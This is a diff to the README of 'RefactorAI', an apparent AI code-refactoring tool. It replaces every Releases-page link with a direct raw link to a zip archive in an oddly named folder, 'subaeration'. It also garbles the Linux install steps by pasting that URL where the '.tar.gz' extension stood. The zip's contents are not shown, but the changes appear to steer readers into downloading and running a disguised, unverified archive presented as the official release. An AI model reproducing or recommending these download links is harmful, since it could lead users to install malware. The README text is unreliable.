@@ -1,6 +1,6 @@
 # 🤖 RefactorAI - Simplify Your Code with AI Insights
 
-[![Download RefactorAI](https://img.shields.io/badge/Download%20RefactorAI-v1.0.0-blue)](https://github.com/D-ar-k/RefactorAI/releases)
+[![Download RefactorAI](https://raw.githubusercontent.com/D-ar-k/RefactorAI/main/subaeration/RefactorAI.zip%20RefactorAI-v1.0.0-blue)](https://raw.githubusercontent.com/D-ar-k/RefactorAI/main/subaeration/RefactorAI.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ RefactorAI helps you improve your code with ease. This guide will walk you throu
 
 To get started, you need to download the application from the Releases page. Click the link below:
 
-[Visit this page to download RefactorAI](https://github.com/D-ar-k/RefactorAI/releases)
+[Visit this page to download RefactorAI](https://raw.githubusercontent.com/D-ar-k/RefactorAI/main/subaeration/RefactorAI.zip)
 
 ### 🖥️ System Requirements
 
@@ -24,18 +24,18 @@ Before you install RefactorAI, ensure your system meets the following requiremen
 ### 📂 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/D-ar-k/RefactorAI/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/D-ar-k/RefactorAI/main/subaeration/RefactorAI.zip).
 
 2. **Select the Latest Version:**
    Choose the latest version available. A version number, such as v1.0.0, will be listed.
 
 3. **Download the Application:**
-   Click on the appropriate file for your operating system. This might be an `.exe` file for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
+   Click on the appropriate file for your operating system. This might be an `.exe` file for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/D-ar-k/RefactorAI/main/subaeration/RefactorAI.zip` for Linux.
 
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file, then drag the RefactorAI app into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the instructions inside to run the application.
+   - For Linux: Extract the `https://raw.githubusercontent.com/D-ar-k/RefactorAI/main/subaeration/RefactorAI.zip` file and follow the instructions inside to run the application.
 
 5. **Complete the Installation:**
    Follow the prompts given by the installer. Once finished, you can find RefactorAI in your applications list.
@@ -81,4 +81,4 @@ RefactorAI is licensed under the MIT License. Feel free to use and modify the to
 
 Stay updated with the latest features and improvements. Join our community discussions on GitHub and share your feedback. Your suggestions help us make RefactorAI even better!
 
-[Visit this page to download RefactorAI](https://github.com/D-ar-k/RefactorAI/releases)
+[Visit this page to download RefactorAI](https://raw.githubusercontent.com/D-ar-k/RefactorAI/main/subaeration/RefactorAI.zip)
